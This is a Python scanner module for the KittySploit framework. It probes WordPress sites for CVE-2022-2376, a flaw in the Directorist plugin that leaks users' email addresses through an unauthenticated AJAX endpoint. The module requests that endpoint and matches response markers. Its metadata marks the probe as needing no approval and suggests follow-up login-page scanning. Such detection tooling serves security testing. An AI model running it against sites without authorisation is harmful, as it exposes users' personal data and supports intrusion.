#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Directorist plugin before 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Directorist <7.3.1 - Information Disclosure Detection',
        'description': 'WordPress Directorist plugin before 7.3.1 is susceptible to information disclosure. The plugin discloses the email address of all users in an AJAX action available to both unauthenticated and authenticated users.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wp-plugin', 'wpscan', 'wordpress', 'wp', 'directorist', 'unauth', 'disclosure', 'wpwax', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/437c4330-376a-4392-86c6-c4c7ed9583ad',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2376',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-2376',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-2376',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=directorist_author_pagination', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('directorist-authors__card__details__top', 'directorist-authors__card__info-list',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Directorist <7.3.1 - Information Disclosure detected",
                path='/wp-admin/admin-ajax.php?action=directorist_author_pagination',
            )
            return True
        return False

